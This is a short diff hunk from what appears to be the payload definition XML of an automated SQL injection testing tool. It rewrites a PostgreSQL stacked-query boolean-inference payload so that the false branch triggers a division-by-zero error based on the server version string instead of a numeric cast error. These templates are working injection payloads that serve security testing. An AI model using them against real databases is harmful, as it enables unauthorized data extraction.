@@ -532,13 +532,13 @@ Tag: <test>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END) IS NULL</vector>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</vector>
         <request>
-            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END) IS NULL</payload>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</payload>
             <comment>--</comment>
         </request>
         <response>
-            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END) IS NULL</comparison>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</comparison>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
